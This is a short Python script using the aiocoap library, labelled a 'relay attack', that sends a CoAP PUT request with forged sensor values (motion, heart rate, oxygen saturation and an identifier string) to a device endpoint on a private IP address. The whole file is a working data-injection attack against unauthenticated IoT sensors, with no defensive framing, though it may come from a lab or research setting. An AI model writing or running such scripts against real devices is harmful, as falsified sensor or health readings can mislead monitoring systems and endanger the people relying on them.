import asyncio
from aiocoap import *


async def relay_attack():
    context = await Context.create_client_context()
    uri = "coap://192.168.115.142:5683/sensor/data"
    payload = "A:10,20,30|G:5,5,5|H:75|S:98|S:abc123xyz"
    request = Message(code=PUT, uri=uri, payload=payload.encode("utf-8"))
    response = await context.request(request).response
    print(f"Response: {response.code}")


# Run the attack
asyncio.run(relay_attack())
